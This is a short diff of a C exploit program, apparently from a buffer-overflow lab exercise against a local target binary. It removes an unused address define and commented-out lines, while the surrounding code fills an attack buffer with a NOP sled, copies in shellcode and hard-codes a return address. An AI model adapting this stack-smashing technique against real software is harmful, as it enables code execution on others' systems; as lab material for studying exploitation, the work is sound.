@@ -5,7 +5,6 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-#define TARGET_ADDR 0x40a4fe10
 #define TARGET_ADDR_0 0x10
 #define TARGET_ADDR_1 0xfe
 #define TARGET_ADDR_2 0xa4
@@ -23,10 +22,6 @@ main ( int argc, char * argv[] )
 	for (i = 0; i < BUFSIZE; i++){
 		attackBuffer[i] = 0x90;
 	}
-	//attackBuffer[BUFSIZE - 4] = TARGET_ADDR_0;
-	//attackBuffer[BUFSIZE - 3] = TARGET_ADDR_1;
-	//attackBuffer[BUFSIZE - 2] = TARGET_ADDR_2;
-	//attackBuffer[BUFSIZE - 1] = TARGET_ADDR_3;
 	for (i = 0; i < SHELLSIZE; i++){
 		attackBuffer[NOPSIZE + i] = shellcode[i];
 	}
